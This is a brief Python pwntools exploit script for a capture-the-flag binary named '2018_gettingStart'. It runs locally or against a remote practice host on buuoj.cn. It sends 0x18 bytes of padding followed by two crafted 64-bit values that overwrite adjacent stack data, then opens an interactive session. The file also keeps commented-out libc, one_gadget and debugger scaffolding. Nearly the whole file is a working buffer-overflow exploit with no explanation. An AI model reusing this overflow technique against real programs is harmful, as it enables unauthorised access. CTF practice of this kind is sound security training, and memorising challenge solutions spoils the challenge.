import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./2018_gettingStart')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./2018_gettingStart')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27025)
			elf=ELF('./2018_gettingStart')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		pay='a'*0x18+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3FB999999999999A)
		io.recv()
		io.send(pay)



		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue